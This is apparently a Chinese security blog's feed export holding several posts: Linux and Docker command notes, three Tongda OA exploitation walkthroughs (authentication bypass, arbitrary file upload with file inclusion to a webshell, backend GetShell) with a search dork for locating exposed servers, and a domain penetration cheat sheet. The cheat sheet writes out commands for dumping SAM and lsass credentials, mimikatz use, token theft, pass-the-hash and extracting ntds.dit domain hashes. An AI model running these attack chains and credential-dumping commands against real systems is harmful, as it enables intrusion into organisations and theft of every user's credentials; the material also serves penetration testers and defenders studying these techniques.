目录下放置了很多记录着发行版各种信息的文件，每个发行版都各自有一套这样记录着相关信息的文件。</p><p>其中 <code>/etc/redhat-release</code> 和 <code>/etc/system-release</code>,<code>/etc/os-release</code> 文件是指向 <code>/etc/[发行版名称]-release</code> 文件的一个连接。</p><img src="../images/upload/cat1.png" style="zoom:50%;" /></li></ul><h3 id="三、查看内核版本"><a href="#三、查看内核版本" class="headerlink" title="三、查看内核版本"></a>三、查看内核版本</h3><ul><li><p><strong>uname</strong>用于显示系统相关信息，比如主机名、内核版本号、硬件架构等。</p><p>-r 显示当前系统的内核版本; -s 显示内核名称</p><img src="../images/upload/uname2.png" style="zoom: 67%;" /></li><li><p><strong>/proc/version</strong>文件记录了 Linux 内核的版本、用于编译内核的 gcc 的版本、内核编译的时间，以及内核编译者的用户名。</p><p><img src="../images/upload/proc.png" alt=""></p></li><li><p><strong>dmesg</strong>（展示信息display message 或驱动程序信息driver message）是大多数类 Unix 操作系统上的一个命令，用于打印内核的消息缓冲区的信息。</p><p><img src="../images/upload/dmesg.png" alt=""></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;font color=green&gt;有时候,我们可能需要获取Linux系统的一些关键信息,以下列举了部分常用的命令做为备忘📝&lt;/font&gt;&lt;/p&gt;
&lt;h3 id=&quot;一、查看系统架构&quot;&gt;&lt;a href=&quot;#一、查看系统架构&quot; class=&quot;headerlink&quot; title=&quot;一、查看系统架构&quot;&gt;&lt;/a&gt;一、查看系统架构&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;hostnamectl&lt;/strong&gt; 工具是用来管理给定主机中使用的三种类型的主机名，可以提供有关你的机器的最基本的信息。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;hostnamectl status&lt;/code&gt;&lt;/p&gt;
&lt;img src=&quot;../images/upload/hostnamectl.png&quot; alt=&quot;hostnamectl&quot; style=&quot;zoom:50%;&quot; /&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>通达OA 后台GetShell</title>
    <link href="http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA3.html"/>
    <id>http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA3.html</id>
    <published>2020-05-16T11:12:20.000Z</published>
    <updated>2020-05-16T12:53:44.582Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-如何后台"><a href="#0x01-如何后台" class="headerlink" title="0x01 如何后台"></a>0x01 如何后台</h3><p>怎么进入后台随便你，可以利用前段时间的<code>任意用户登录漏洞</code></p><p><img src="../images/upload/loginadmin.png" alt="login"></p><a id="more"></a><h3 id="0x02-更改配置"><a href="#0x02-更改配置" class="headerlink" title="0x02 更改配置"></a>0x02 更改配置</h3><p>此处利用系统管理-&gt;附件管理📎</p><p><img src="../images/upload/fujian.png" alt="fujian"></p><p>此站点并未设置存储目录，点击添加目录</p><p><img src="../images/upload/fujian2.png" alt="fujian"></p><p>目录中要设置网站根目录，根目录可以通过系统管理-&gt;系统信息处获得</p><p><img src="../images/upload/fujian3.png" alt="gujian3"></p><p><img src="../images/upload/fujian4.png" alt="fujian4"></p><p>记得勾选<code>将所有新附件存该目录</code>，然后保存</p><p><img src="../images/upload/fujian5.png" alt="fujian5"></p><h3 id="0x03-上传附件"><a href="#0x03-上传附件" class="headerlink" title="0x03 上传附件"></a>0x03 上传附件</h3><p>通过组织下的聊天框，选中自己后发送任意附件，利用BurpSuite拦截</p><p><img src="../images/upload/fujian6.png" alt="fujian6"></p><p><img src="../images/upload/oa31.png" alt="oa31"></p><p><a href="../file/upshell.txt">上传附件 request.txt</a></p><p><img src="../images/upload/oa3.png" alt="oa3"></p><p><img src="../images/upload/oa32.png" alt="oa32"></p><p><img src="../images/upload/oa33.png" alt="oa33"></p><p><img src="../images/upload/oa34.png" alt="oa34"></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-如何后台&quot;&gt;&lt;a href=&quot;#0x01-如何后台&quot; class=&quot;headerlink&quot; title=&quot;0x01 如何后台&quot;&gt;&lt;/a&gt;0x01 如何后台&lt;/h3&gt;&lt;p&gt;怎么进入后台随便你，可以利用前段时间的&lt;code&gt;任意用户登录漏洞&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/upload/loginadmin.png&quot; alt=&quot;login&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="通达OA" scheme="http://yoursite.com/categories/%E9%80%9A%E8%BE%BEOA/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>通达OA 任意文件上传/文件包含GetShell</title>
    <link href="http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA2.html"/>
    <id>http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA2.html</id>
    <published>2020-05-16T06:33:06.000Z</published>
    <updated>2020-05-16T12:11:25.365Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h3><p>攻击者可以绕过身份认证，上传任意文件，结合文件包含漏洞即可实现RCE。<br>影响版本包含：<br>文件上传：<br><code>V11版 &lt;= 11.3    20200103 2017版 &lt;= 10.19  20190522 2016版 &lt;= 9.13   20170710 2015版 &lt;= 8.15   20160722 2013增强版 &lt;=7.25 20141211 2013版 &lt;= 6.20   20141017</code><a id="more"></a></p><p>文件包含：</p><p><code>V11版 &lt;= 11.3</code></p><h3 id="0x02-解密工具"><a href="#0x02-解密工具" class="headerlink" title="0x02 解密工具"></a>0x02 解密工具</h3><p>代码通过Zend加密处理，需对进行解密操作后获得可读性源码</p><ul><li>离线解密：<code>链接: https://pan.baidu.com/s/1MHtt3KXVIZAALzZmzTUJeg 密码: tadp</code></li><li>在线解密：<code>http://dezend.qiling.org/free.html</code></li></ul><p><a href="https://github.com/jas502n/OA-tongda-RCE/tree/master/tongda/decode" target="_blank" rel="noopener">解密后的部分代码</a></p><h3 id="0x03-漏洞成因"><a href="#0x03-漏洞成因" class="headerlink" title="0x03 漏洞成因"></a>0x03 漏洞成因</h3><ul><li>漏洞主要两个原因，文件上传、文件包含</li></ul><p><strong>文件上传</strong></p><p>ispirit/im/upload.php<br>要上传先要绕过登录认证，但在upload.php修复前，如果变量<code>$P</code>非空则不经过auth.php验证即可执行后续代码</p><p><img src="../images/upload/comper.png" alt="代码对比"></p><p>上传后的文件不在根目录，所以无法直接利用，需结合文件包含</p><p><strong>文件包含</strong></p><p>ispirit/interface/gateway.php<br>这里问题在于可以构造json，使其执行<code>include_once</code>代码</p><p><img src="../images/upload/sour.png" alt="include"></p><h3 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h3><p>1.上传文件请求</p><p><img src="../images/upload/upim.jpg" alt="upload"></p><p><a href="../file/upload.txt">命令执行request.txt</a>    <a href="../file/getshell.txt">GetWebshell request.txt</a></p><p>2.包含文件执行命令</p><p><img src="../images/upload/exec.jpg" alt="exec"></p><p><a href="../file/exec.txt">执行命令 request.txt</a></p><h3 id="0x05-异常处理"><a href="#0x05-异常处理" class="headerlink" title="0x05 异常处理"></a>0x05 异常处理</h3><ul><li><strong>版本路径</strong>：</li></ul><p>有些版本gateway.php路径不同</p><p>例如2013：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;ispirit&#x2F;im&#x2F;upload.php</span><br><span class="line">&#x2F;ispirit&#x2F;interface&#x2F;gateway.php</span><br></pre></td></tr></table></figure><p><strong>例如2017：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;ispirit&#x2F;im&#x2F;upload.php</span><br><span class="line">&#x2F;mac&#x2F;gateway.php</span><br><span class="line"></span><br><span class="line">C:\MYOA&gt;dir &#x2F;s &#x2F;b gateway.php</span><br><span class="line">C:\MYOA\webroot\mac\gateway.php</span><br></pre></td></tr></table></figure><ul><li><strong>上传后无回显：</strong></li></ul><p><img src="../images/upload/noecho.png" alt="noecho"></p><p>部分网站无上传回显，把UPLOAD_MODE参数的值改为1就可以正常拿到上传后的文件名了。</p><p><img src="../images/upload/noecho2.png" alt="noecho2"></p><ul><li><strong>为什么你没成功：</strong></li></ul><p>我试了许多版本，发现返回<code>2005_xxxxxx</code>的都不能成功，网上复现利用成功的都是<code>2003_xxxxxx</code><br>不知道怎么搞</p><hr><p><a href="https://github.com/jas502n/OA-tongda-RCE" target="_blank" rel="noopener">参考链接🔗</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-漏洞信息&quot;&gt;&lt;a href=&quot;#0x01-漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞信息&quot;&gt;&lt;/a&gt;0x01 漏洞信息&lt;/h3&gt;&lt;p&gt;攻击者可以绕过身份认证，上传任意文件，结合文件包含漏洞即可实现RCE。&lt;br&gt;影响版本包含：&lt;br&gt;文件上传：&lt;br&gt;&lt;code&gt;V11版 &amp;lt;= 11.3    20200103
 2017版 &amp;lt;= 10.19  20190522
 2016版 &amp;lt;= 9.13   20170710
 2015版 &amp;lt;= 8.15   20160722
 2013增强版 &amp;lt;=7.25 20141211
 2013版 &amp;lt;= 6.20   20141017&lt;/code&gt;
    
    </summary>
    
    
      <category term="通达OA" scheme="http://yoursite.com/categories/%E9%80%9A%E8%BE%BEOA/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>通达OA 任意用户登录漏洞复现</title>
    <link href="http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA1.html"/>
    <id>http://yoursite.com/2020/%E9%80%9A%E8%BE%BEOA1.html</id>
    <published>2020-05-15T21:36:01.000Z</published>
    <updated>2020-05-16T06:36:13.357Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-漏洞信息"><a href="#0x01-漏洞信息" class="headerlink" title="0x01 漏洞信息"></a>0x01 漏洞信息</h3><p>通达OA前台任意用户登录漏洞，影响版本包括通达OA2017、V11.X&lt;V11.5；攻击者利用此漏洞可以接管服务器权限<br><img src="../images/upload/tongd.jpg" alt="OA" style="zoom: 80%;" /></p><a id="more"></a><h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>1.获取code_uid<br>post   /general/login_code.ph 获取code_uid</p><p><img src="../images/upload/code_uid.png" alt="example"></p><p><a href="../file/code_uid.txt">request.txt</a></p><p>2.获取sessionID<br>post  /logincheck_code.php</p><p><img src="../images/upload/sessid.jpg" alt="example"></p><p><a href="../file/sessionID.txt">requests.txt</a></p><p>3.实现登录<br>访问<a href="http://xxxx.com/general/index.php" target="_blank" rel="noopener">http://xxxx.com/general/index.php</a> 利用上一步得到的cookies，<br>通过小饼干🍪等工具替换cookie，刷新页面即可成功进入</p><p><img src="../images/upload/admin1.png" alt="example"></p><h3 id="0x03-漏洞POC"><a href="#0x03-漏洞POC" class="headerlink" title="0x03 漏洞POC"></a>0x03 漏洞POC</h3><p><a href="https://github.com/NS-Sp4ce/TongDaOA-FaKe-User" target="_blank" rel="noopener">https://github.com/NS-Sp4ce/TongDaOA-FaKe-User</a></p><p>利用POC测试站点，若存在漏洞，返回cookie；利用cookie便可直接登录</p><p><img src="../images/upload/poc1.png" alt="poc_result"></p><h3 id="0x04-关键词"><a href="#0x04-关键词" class="headerlink" title="0x04 关键词"></a>0x04 关键词</h3><p><a href="https://zoomeye.org" target="_blank" rel="noopener">https://zoomeye.org</a> 中搜索<code>app:&quot;Tongda office anywhere httpd&quot;</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-漏洞信息&quot;&gt;&lt;a href=&quot;#0x01-漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞信息&quot;&gt;&lt;/a&gt;0x01 漏洞信息&lt;/h3&gt;&lt;p&gt;通达OA前台任意用户登录漏洞，影响版本包括通达OA2017、V11.X&amp;lt;V11.5；攻击者利用此漏洞可以接管服务器权限&lt;br&gt;&lt;img src=&quot;../images/upload/tongd.jpg&quot; alt=&quot;OA&quot; style=&quot;zoom: 80%;&quot; /&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="通达OA" scheme="http://yoursite.com/categories/%E9%80%9A%E8%BE%BEOA/"/>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>域渗透知识备忘</title>
    <link href="http://yoursite.com/2020/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E5%A4%87%E5%BF%98.html"/>
    <id>http://yoursite.com/2020/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9F%A5%E8%AF%86%E5%A4%87%E5%BF%98.html</id>
    <published>2020-04-26T08:51:05.000Z</published>
    <updated>2021-04-14T06:13:20.539Z</updated>
    
    <content type="html"><![CDATA[<p>域渗透的一般流程：</p><p>入口主机–&gt;权限维持–&gt;横向渗透–&gt;取密码(域用户)–&gt;域信息收集–&gt;横向渗透–&gt;接管域控 </p><h3 id="一、域信息收集"><a href="#一、域信息收集" class="headerlink" title="一、域信息收集"></a>一、域信息收集</h3><p><strong>1、net</strong></p><p><code>net user /domain</code>  获取域用户列表<br><code>net group. &quot;domain admins&quot; /doamin</code>  获取域管理员列表<br><code>net group &quot;domain controllers&quot; /domain</code>  查看域控制器(如果有多台)<br><code>net group &quot;domail computers&quot; /domain</code>  查看域机器<br><code>net group /domain</code>  查询域里面的组<a id="more"></a></p><p><code>net view</code>  查看同一域内机器列表<br><code>net view \\ip</code>  查看某IP共享<br><code>net view \\GHQ</code>  查看GHQ计算机的共享资源列表<br><code>net view /domain</code>  查看内网存在多少个域<br><code>net view /domain:XYZ</code>  查看XYZ域中的机器列表</p><p><strong>2、nltest信任域</strong></p><p>查询域间的信任关系<br><code>nettles  /domain_trusts /all_trusts /v /server:192.168.52.2</code><br>返回所有信任192.168.52.2的域</p><p><code>nltest /dsgedc:XXXXX /serve:192.168.52.2</code><br>返回域控和其相应的IP地址，XXXXX是上步骤结果中的一个域</p><p>nltest的命令：<br><a href="https://www.cnblogs.com/dreamer-fish/p/3473895.html" target="_blank" rel="noopener">https://www.cnblogs.com/dreamer-fish/p/3473895.html</a></p><p><strong>3、nbtscan.exe</strong></p><p>扫描网段内是否存在域内机器</p><p><code>nbtscan.exe 192.168.52.0/24</code></p><p><strong>4、csvde</strong></p><p>csvde是windows server 2008的内置命令行工具，如果安装了AD DS或Active Directory轻型目录服务，则功能可用<br><code>csvde -setspn hack -f c:\windows\temp\hack.csv</code><br>LDAP的存储规则：<br>区分名(DN)：一个条目的区分名叫做‘dn’，在一个目录中这个名称总是唯一的<br>CN=Common Name为用户名或服务器名，最长可以到80个字符，可以为中文<br>OU=Organization Unit为组织单元，最多可以有四级，每级最长32个字符，可以为中文<br>O=Organization 为组织名，可以3-64个字符长<br>C=Country为国家名，可选，为2个字符长</p><p><strong>5、setspn</strong></p><p><code>setspn -T 域名 -Q */*</code></p><ul><li>SPN官方名称即“服务主体名称”，本质上存的是域内各种服务资源的对应关系</li><li>如，对应的服务类型是什么，机器名是什么，服务端口是多少</li><li>借助SPN可以快速定位当前目标域中所有存活的各类服务器</li></ul><p>例如查找mssql服务器<br><code>setspn -T 域名 -Q */* | findstr MSSQL</code></p><p><strong>6、dnsdump.exe</strong></p><p>获取域名其对应的IP地址<br><code>dnsdump.exe -u 域名/域用户 -p 域密码 域控机器名 -r</code></p><h3 id="二、域渗透思路"><a href="#二、域渗透思路" class="headerlink" title="二、域渗透思路"></a>二、域渗透思路</h3><h4 id="2-1、注册表读取密码-本地"><a href="#2-1、注册表读取密码-本地" class="headerlink" title="2.1、注册表读取密码-本地"></a>2.1、注册表读取密码-本地</h4><p>​    <strong>1、获取注册表信息</strong>：<br><code>reg save HKLM\SYSTEM c:\windows\temp\Sys.hiv</code><br><code>reg save HKLM\SAM c:\windows\temp\Sam.hiv</code></p><p>​    <strong>2、mimikatz解密</strong><br><code>lsadump::sam /sam:Sam.hiv /system:Sys.hiv</code></p><h4 id="2-2、lsass进程读取内存hash"><a href="#2-2、lsass进程读取内存hash" class="headerlink" title="2.2、lsass进程读取内存hash"></a>2.2、lsass进程读取内存hash</h4><p>windows 03和08中明文存储账号密码；12和16中加密为hash值</p><p>​    <strong>1、目标机执行procdump.exe</strong><br><code>procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp</code></p><p>​    <strong>2、mimikatz中运行,结果保存在日志里</strong><br><code>mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;</code></p><h4 id="2-3、LaZagne取各种连接工具密码，浏览器保存密码等"><a href="#2-3、LaZagne取各种连接工具密码，浏览器保存密码等" class="headerlink" title="2.3、LaZagne取各种连接工具密码，浏览器保存密码等"></a>2.3、LaZagne取各种连接工具密码，浏览器保存密码等</h4><p><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="noopener">https://github.com/AlessandroZ/LaZagne</a></p><h4 id="2-4、凭证窃取"><a href="#2-4、凭证窃取" class="headerlink" title="2.4、凭证窃取"></a>2.4、凭证窃取</h4><p>通过tasklist /v查看进程用户，如果有域用户开启的进程，则窃取凭证</p><p><code>incognito.exe list_tokens -u</code>  查看目标机当前存储那些凭证<br><code>incognito.exe execute -c &quot;HACK\Administrator&quot; cmd.exe</code>  使用域用户administrator凭证开启一个cmd</p><h4 id="2-5、命令行渗透-IPC连接"><a href="#2-5、命令行渗透-IPC连接" class="headerlink" title="2.5、命令行渗透-IPC连接"></a>2.5、命令行渗透-IPC连接</h4><p>为什么命令后渗透？？<br>1、远程登录桌面增加暴漏风险<br>2、目标管理员可能对服务器禁用远程登录</p><ul><li>建立ipc连接<br>可以访问目标机器的文件(上传、下载)，也可以在目标机器上运行命令上传和下载文件直接通过copy命令就可以，<br>不过路径换成UNC路径。以\开头的路径就是UNC路径，比如\192.168.1.1\c$\users</li></ul><p><code>net use \\192.168.1.1 /u:域\域用户名 域用户密码</code><br>例如：<code>net use \\192.168.1.1 /u:hack\administrator  1q2w3</code></p><ul><li><p>第二步：上传/下载文件<br>例如：从本地上传1.bat到192.168.1.1机器C盘根目录下<br><code>copy 1.bat \\192.168.1.1\C$\</code></p><p>dir、copy、xcopy、move、type的参数都可以使用UNC路径</p></li></ul><h4 id="2-6、命令行渗透-计划任务执行命令"><a href="#2-6、命令行渗透-计划任务执行命令" class="headerlink" title="2.6、命令行渗透-计划任务执行命令"></a>2.6、命令行渗透-计划任务执行命令</h4><ul><li><p>创建计划任务<br><code>schtasks /create /tn 任务名 /U 域\域用户 /P 域用户密码 /tr 执行的命令或者bat路径 /sc ONSTART /s 域机器IP /RU system</code></p></li><li><p>执行计划任务</p><p><code>schtasks /run /tn 任务名 /s 域机器IP /U 域\域用户 -P 域用户密码</code></p></li><li><p>删除计划任务</p><p><code>schtasks /F /delete /tn 任务名 /s 域机器IP /U 域\域用户 /P 域用户密码</code></p></li></ul><p>例如：在192.168.1.1上建立task1任务（以system权限执行cmd程序）<br><code>schtasks /create /tn task1 /U hack\administrator /P 1q2w3e -tr &quot;c:\windows\system32\cms.exe /c whoami &gt; c:\\windows\\temp\\1.txt&quot; /sc ONSTART /s 192.168.1.1 /RU system</code></p><h4 id="2-7、命令行渗透-psexec-exe"><a href="#2-7、命令行渗透-psexec-exe" class="headerlink" title="2.7、命令行渗透-psexec.exe"></a>2.7、命令行渗透-psexec.exe</h4><p><strong>知道域账号密码</strong></p><ul><li><p>建立IPC连接</p><p><code>net use \\192.168.1.1 /u:域\域用户名 域用户密码</code></p></li><li><p>执行命令</p><p><code>psexec.exe \\192.168.1.1 -s cmd.exe -accepteula</code><br>-accepteula第一次运行回弹框，输入这个参数便不会弹框；-s 以“nt authority\system”权限运行远程进程</p></li></ul><p><strong>不知明文域账号密码，hash传递</strong></p><p><code>psexec_hash.exe -hashes :用户hash 域名\用户名@目标IP</code></p><h4 id="2-8、获取内网代理"><a href="#2-8、获取内网代理" class="headerlink" title="2.8、获取内网代理"></a>2.8、获取内网代理</h4><p>内网中有些资源可能需要挂指定<code>代理</code>才能进行访问，一般是<code>IE</code>代理或<code>PAC</code>代理，这两个代理可以通过注册表来读取。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer</span><br><span class="line">reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v AutoConfigURL</span><br></pre></td></tr></table></figure><h3 id="三、Windows-api-利用"><a href="#三、Windows-api-利用" class="headerlink" title="三、Windows api 利用"></a>三、Windows api 利用</h3><p>以下所有利用工具的前提都是已经<code>建立IPC连接</code></p><table><thead><tr><th align="left">工具名称</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">NetGroupGetUsers.exe</td><td align="left">查询域里的各个组里的成员，IP必须是域控IP，域用户随意</td></tr><tr><td align="left">NetLocalGroupGetMembers.exe</td><td align="left">查询目标服务器本地管理组的成员</td></tr><tr><td align="left">NetUserEnum.exe</td><td align="left">查询目标服务器所有用户，包括隐藏用户</td></tr></tbody></table><p>命令用法如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NetGroupGetUsers.exe "domain users" \\192.168.52.2</span><br><span class="line">NetLocalGroupGetMembers.exe \\192.168.52.2</span><br><span class="line">NetUserEnum.exe \\192.168.52.2</span><br></pre></td></tr></table></figure><h3 id="四、导域HASH"><a href="#四、导域HASH" class="headerlink" title="四、导域HASH"></a>四、导域HASH</h3><p>拿下域控之后，我们可以通过导出域hash将所有域用户的密码取出。</p><p><code>Windows</code>的密码是经过<code>hash</code>后存储的，本地存放在<code>hklm\sam</code>以及<code>hklm\system</code>注册表中，域里面是存放在域控制器的<code>c:\windows\ntds\ntds.dit</code>中。<br><code>ntds.dit</code>其实就是个<code>esent</code>数据库，微软本身就有一系列文档化的<code>api</code>能够操作这个数据库：<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/gg294074.aspx" target="_blank" rel="noopener">官方文档</a>，首先我们要创建一个快照：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot "activate instance ntds" creat quit quit</span><br></pre></td></tr></table></figure><p>接下来我们挂载快照：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot "mount &#123;快照id&#125;" quit quit</span><br></pre></td></tr></table></figure><p>接下来我们复制<code>ntds.dit</code>到本地：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 装载位置\windows\NTDS\ntds.dit C:\ntds.dit</span><br></pre></td></tr></table></figure><p>接下来我们解除挂载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot "unmount &#123;快照id&#125;" quit quit</span><br></pre></td></tr></table></figure><p>最后删除快照：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot "delete &#123;快照id&#125;" quit quit</span><br></pre></td></tr></table></figure><p>接下来我们就可以开始解密了，首先通过注册表的方式获取<code>KEY</code>，再用<code>NTDSDumpEx</code>获取所有域用户hash：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM c:\windows\temp\sys.hiv</span><br><span class="line">NTDSDdumpEx.exe -d ntds.dit -o hash.txt -s sys.hiv -h</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;域渗透的一般流程：&lt;/p&gt;
&lt;p&gt;入口主机–&amp;gt;权限维持–&amp;gt;横向渗透–&amp;gt;取密码(域用户)–&amp;gt;域信息收集–&amp;gt;横向渗透–&amp;gt;接管域控 &lt;/p&gt;
&lt;h3 id=&quot;一、域信息收集&quot;&gt;&lt;a href=&quot;#一、域信息收集&quot; class=&quot;headerlink&quot; title=&quot;一、域信息收集&quot;&gt;&lt;/a&gt;一、域信息收集&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;1、net&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;net user /domain&lt;/code&gt;  获取域用户列表&lt;br&gt;&lt;code&gt;net group. &amp;quot;domain admins&amp;quot; /doamin&lt;/code&gt;  获取域管理员列表&lt;br&gt;&lt;code&gt;net group &amp;quot;domain controllers&amp;quot; /domain&lt;/code&gt;  查看域控制器(如果有多台)&lt;br&gt;&lt;code&gt;net group &amp;quot;domail computers&amp;quot; /domain&lt;/code&gt;  查看域机器&lt;br&gt;&lt;code&gt;net group /domain&lt;/code&gt;  查询域里面的组
    
    </summary>
    
    
    
      <category term="Penetration" scheme="http://yoursite.com/tags/Penetration/"/>
    
  </entry>
  
  <entry>
    <title>docker常用命令</title>
    <link href="http://yoursite.com/2020/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html"/>
    <id>http://yoursite.com/2020/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html</id>
    <published>2020-04-20T07:36:38.000Z</published>
    <updated>2020-04-26T08:35:07.352Z</updated>
    
    <content type="html"><![CDATA[<p><font color=green>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源，可用于开发，交付和运行应用程序的开放平台。而在安全测试中我们可以利用docker快速搭建出理想环境，进而复现测试漏洞，下面👇我整理出来一些常用命令，作为备忘。</font></p><h3 id="0、重点！重点！重点！"><a href="#0、重点！重点！重点！" class="headerlink" title="0、重点！重点！重点！"></a>0、重点！重点！重点！</h3><p>Docker三要素：<font color=red>镜像、容器、仓库</font><br>仓库：集中存放镜像文件的地方；仓库分为公开仓库和私有仓库，目前全世界最大的仓库是Docker官方的 Docker Hub<br>镜像：Docker 镜像（Image），就相当于是一个 root 文件系统。<br>容器：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。<a id="more"></a></p><h3 id="1、帮助命令："><a href="#1、帮助命令：" class="headerlink" title="1、帮助命令："></a>1、帮助命令：</h3><ul><li>查看docker版本信息：docker  version</li><li>查看系统相关信息：docker  info</li><li>查看docker帮助文档：docker  –help</li></ul><h3 id="2、镜像命令："><a href="#2、镜像命令：" class="headerlink" title="2、镜像命令："></a>2、镜像命令：</h3><ul><li>列出本地主机的镜像：docker  images <pre><code>可选参数：      -a：所有镜像；       -q：只显示镜像ID；       --digests：显示镜像摘要信息      --no-trunc：显示完整的镜像信息</code></pre></li><li>搜索某个镜像：docker  search  镜像名 [options]<pre><code>可选参数：      --no-trunc：显示完整的镜像描述      -f：按key=value过滤结果      --limit：限制结果条数,默认25条结果</code></pre></li><li>下载某个镜像：docker  pull 镜像名[:TAG]</li><li>删除本地镜像：<pre><code>删除单个：docker  rmi  -f 镜像ID删除多个：docker  rmi -f 镜像名1:TAG 镜像名2:TAG删除全部：docker  rmi -f $(docker  images  -qa</code></pre></li></ul><h3 id="3、容器命令："><a href="#3、容器命令：" class="headerlink" title="3、容器命令："></a>3、容器命令：</h3><ul><li><p>新建并启动容器：docker  run  [options] 镜像名/imageID<br>常用options选项：</p><pre><code>--name=&quot;容器新名字&quot;：为容器指定一个名称   -d：后台运行容器，并返回容器ID-i：以交互模式运行容器，通常与-t同时使用-t：为容器重新分配一个伪输入的终端-P：随机端口映射-p：指定端口映射，有以下四种格式    ip:hostPort:containerPort    ip::containerPort    &lt;font color=red&gt;hostPort:containerPort&lt;/font&gt;    containerPort</code></pre></li><li><p>列出运行的容器：docker  ps  [options]<br>常用options选项：</p><pre><code>-a :列出当前所有正在运行的容器+历史上运行过的-l :显示最近创建的容器。-n：显示最近n个创建的容器。-q :静默模式，只显示容器编号。--no-trunc :不截断输出。</code></pre></li><li><p>退出容器：<br>exit：容器停止并退出<br>ctrl：容器不停止退出</p></li><li><p>启动容器：docker start 容器ID/容器名</p></li><li><p>重启容器：docker restart 容器ID/容器名</p></li><li><p>停止容器：docker stop 容器ID/容器名</p></li><li><p>强制停止容器：docker kill 容器ID/容器名</p></li><li><p>删除停止的容器：docker rm 容器ID<br>一次性删除多个容器：docker  rm -f $(docker ps -qa)</p></li></ul><h3 id="4、其它命令："><a href="#4、其它命令：" class="headerlink" title="4、其它命令："></a>4、其它命令：</h3><ul><li>查看容器日志：docker logs -f -t –tail 容器ID<br>-t：显示时间戳<pre><code>-f：跟随最新日志打印--tail：数字 显示最后多少条</code></pre></li><li>查看容器内运行的进程：docker top 容器ID</li><li>查看容器内详情：docker inspect 